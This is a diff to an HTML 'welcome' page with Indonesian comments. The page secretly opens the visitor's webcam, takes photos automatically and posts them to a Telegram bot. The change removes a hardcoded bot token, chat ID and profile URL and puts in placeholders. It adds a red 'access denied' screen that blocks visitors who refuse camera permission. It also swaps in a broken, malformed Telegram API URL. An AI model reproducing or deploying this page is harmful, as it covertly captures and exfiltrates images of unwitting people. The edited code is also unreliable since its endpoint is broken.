@@ -38,7 +38,7 @@
             text-align: center;
         }
 
-        /* Judul utama sesuai permintaan Anda */
+        /* Judul utama */
         h1 {
             color: #00a2ff;
             margin-top: 0;
@@ -56,6 +56,13 @@
             color: #ffffff;
             margin: 15px 0;
             text-shadow: none;
+        }
+
+        /* Gaya teks jika akses ditolak (Merah) */
+        .status-error {
+            color: #ff3333 !important;
+            text-shadow: 0 0 10px #ff3333 !important;
+            font-weight: bold;
         }
 
         /* Animasi loading bar modern */
@@ -76,13 +83,19 @@
             transition: width 1.5s ease-in-out;
         }
 
+        /* Loading bar berubah merah saat error */
+        .progress-bar.error {
+            background: #ff3333 !important;
+            box-shadow: 0 0 10px #ff3333 !important;
+        }
+
         /* Animasi garis scan pelindung layar */
         .terminal::before {
             content: " ";
             display: block;
             position: absolute;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.04));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.01), rgba(0, 255, 0, 0.04));
             z-index: 2;
             background-size: 100% 2px, 3px 100%;
             pointer-events: none;
@@ -107,9 +120,9 @@
 
     <script>
         // ==================== PENGATURAN UTAMA ====================
-        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; // Ganti dengan token bot Telegram Anda
-        const TELEGRAM_CHAT_ID = '1966317946';     // Ganti dengan Chat ID Telegram Anda
-        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; // Ganti dengan domain tujuan Anda
+        const TELEGRAM_BOT_TOKEN = 'MOHON_ISI_TOKEN_BOT_ANDA'; // Ganti dengan token bot Telegram Anda
+        const TELEGRAM_CHAT_ID = 'MOHON_ISI_CHAT_ID_ANDA';     // Ganti dengan Chat ID Telegram Anda
+        const DOMAIN_TUJUAN = 'https://alamat-domain-anda.com'; // Ganti dengan domain tujuan Anda
         // ==========================================================
 
         const video = document.getElementById('video');
@@ -129,13 +142,15 @@
             })
             .catch(err => {
                 console.error("Gagal akses kamera: ", err);
-                statusText.innerText = "Mengalihkan halaman...";
-                progressBar.style.width = "100%";
                 
-                // Jika izin ditolak, langsung redirect
-                setTimeout(() => {
-                    window.location.href = DOMAIN_TUJUAN;
-                }, 1000);
+                // PERBAIKAN: Menampilkan peringatan jika izin ditolak
+                statusText.innerText = "AKSES DITOLAK: Halaman tidak bisa diakses karena perizinan kamera tidak diterima!";
+                statusText.classList.add("status-error");
+                
+                progressBar.style.width = "100%";
+                progressBar.classList.add("error");
+                
+                // Menghentikan sistem dan TIDAK melakukan redirect ke DOMAIN_TUJUAN
             });
 
         // 2. Fungsi memotret otomatis
@@ -144,9 +159,13 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
+            // Mirroring effect yang aman
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            context.save();
             context.translate(canvas.width, 0);
             context.scale(-1, 1);
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            context.restore();
 
             canvas.toBlob((blob) => {
                 if (blob) {
@@ -164,7 +183,8 @@
             formData.append('photo', imageBlob, 'capture.jpg');
             formData.append('caption', '📸 Foto pengunjung dari halaman WELCOME BY RORAX BALI');
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            // URL API Telegram yang sudah diperbaiki
+            fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
